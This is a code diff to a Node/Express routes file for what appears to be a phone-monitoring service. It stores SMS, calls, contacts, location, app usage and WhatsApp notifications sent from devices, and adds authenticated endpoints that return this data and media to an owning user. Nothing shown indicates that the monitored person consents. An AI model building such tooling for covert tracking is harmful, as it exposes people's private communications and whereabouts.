@@ -1,4 +1,3 @@
-// routes/data.js (substituir as rotas POST por versões que exigem device registrado/associado)
 const express = require('express');
 const Sms = require('../models/Sms');
 const Call = require('../models/Call');
@@ -6,10 +5,12 @@ const Contact = require('../models/Contact');
 const Location = require('../models/Location');
 const Device = require('../models/Device');
 const AppUsage = require('../models/AppUsage');
-const Notification = require('../models/Notification'); // novo
-const router = express.Router();
+const Notification = require('../models/Notification');
 
-// Helper: require device registered & associated to a user
+const router = express.Router();
+const { requireUser } = require('../middleware/auth');
+
+// helper: require device to exist and be associated to a user
 async function requireRegisteredDevice(deviceId) {
   if (!deviceId) throw { status: 400, message: 'deviceId required' };
   const dev = await Device.findOne({ deviceId });
@@ -65,7 +66,7 @@ router.post('/contacts', async (req, res) => {
     if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be array' });
     const userId = dev.user;
     const docs = contacts.map(c => ({ deviceId, user: userId, name: c.name || '', number: c.number || '' }));
-    await require('../models/Contact').insertMany(docs);
+    await Contact.insertMany(docs);
     res.json({ ok: true, inserted: docs.length });
   } catch (e) {
     console.error('contacts err', e);
@@ -86,7 +87,7 @@ router.post('/location', async (req, res) => {
     });
     await doc.save();
 
-    // emit socket to owning user
+    // emit socket to user
     const io = req.app.locals.io;
     if (io && doc.user) {
       io.to(`user:${String(doc.user)}`).emit('location:new', {
@@ -121,7 +122,7 @@ router.post('/app-usage', async (req, res) => {
   }
 });
 
-// POST /api/whatsapp -> now store as Notification
+// POST /api/whatsapp (notifications)
 router.post('/whatsapp', async (req, res) => {
   try {
     const { deviceId, message, timestamp, packageName, title } = req.body;
@@ -149,6 +150,53 @@ router.post('/whatsapp', async (req, res) => {
     const status = e.status || 500;
     return res.status(status).json({ error: e.message || 'server error' });
   }
+});
+
+/* ---------------------------
+   GET endpoints (protected)
+   --------------------------- */
+
+const SmsModel = require('../models/Sms');
+const CallModel = require('../models/Call');
+const ContactModel = require('../models/Contact');
+const LocationModel = require('../models/Location');
+const MediaModel = require('../models/Media');
+const AppUsageModel = require('../models/AppUsage');
+const NotificationModel = require('../models/Notification');
+
+router.get('/sms', requireUser, async (req, res) => {
+  const docs = await SmsModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
+  res.json(docs);
+});
+
+router.get('/call', requireUser, async (req, res) => {
+  const docs = await CallModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
+  res.json(docs);
+});
+
+router.get('/contacts', requireUser, async (req, res) => {
+  const docs = await ContactModel.find({ user: req.user.id }).sort({ name: 1 }).limit(5000).lean();
+  res.json(docs);
+});
+
+router.get('/location', requireUser, async (req, res) => {
+  const docs = await LocationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(1000).lean();
+  res.json(docs);
+});
+
+router.get('/whatsapp', requireUser, async (req, res) => {
+  const docs = await NotificationModel.find({ user: req.user.id }).sort({ timestamp: -1 }).limit(500).lean();
+  res.json(docs);
+});
+
+router.get('/app-usage', requireUser, async (req, res) => {
+  const docs = await AppUsageModel.find({ user: req.user.id }).sort({ createdAt: -1 }).limit(500).lean();
+  res.json(docs);
+});
+
+router.get('/media', requireUser, async (req, res) => {
+  const docs = await MediaModel.find({ user: req.user.id }).sort({ uploadDate: -1 }).limit(500).lean();
+  res.json(docs);
 });
 
 module.exports = router;
